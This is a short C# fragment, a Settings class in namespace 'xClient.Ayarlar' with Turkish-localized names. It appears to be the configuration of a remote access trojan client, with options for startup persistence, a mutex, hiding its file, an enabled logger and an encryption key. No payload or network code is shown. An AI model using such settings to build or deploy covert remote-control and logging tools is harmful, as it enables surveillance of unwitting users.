...
namespace xClient.Ayarlar
{
    public static class Settings
    {
        ...
        public static string INSTALLNAME = "YÜKLE";
        public static bool INSTALL = false;
        public static bool STARTUP = true;
        public static string MUTEX = "MUTEX";
        public static string STARTUPKEY = "BAŞLANGIÇ";
        public static bool HIDEFILE = true;
        public static bool ENABLELOGGER = true;
        public static string ENCRYPTIONKEY = "ENCANAHTARI";
        public static string TAG = "BOŞALT";
        public static string LOGDIRECTORYNAME = "Kayıtlar";
        public static bool HIDELOGDIRECTORY = false;
        ...
        {
            if (PlatformYardımcısı.A64Bitmi) return;
